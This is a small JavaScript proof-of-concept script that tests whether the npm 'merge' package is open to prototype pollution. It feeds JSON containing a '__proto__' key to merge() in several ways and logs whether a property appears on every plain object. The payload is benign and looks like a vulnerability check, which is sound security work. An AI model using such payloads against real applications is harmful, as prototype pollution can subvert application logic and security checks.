// const merge = require("merge");
// var original, cloned;
// var original1 = {
//   a: "foo",
//   b: "bar",
// };
// var original2 = {
//   baz: "__proto__.a",
//   buzz: "la",
// };
// var a = {
//   zed: function () { 
//     return "crap"
//   }
// }
let  merge = require('merge');
let BAD_JSON = JSON.parse('{"__proto__": {"test": 123}}');
let totest = merge;
totest( BAD_JSON);
console.log({}.test); // true
totest({}, BAD_JSON);
console.log({}.test); // true
totest(BAD_JSON, {});
console.log({}.test); // true
totest(BAD_JSON, BAD_JSON);
console.log({}.test); // true
// merge.recursive({}, payload);
// console.log({}.test); // true
 
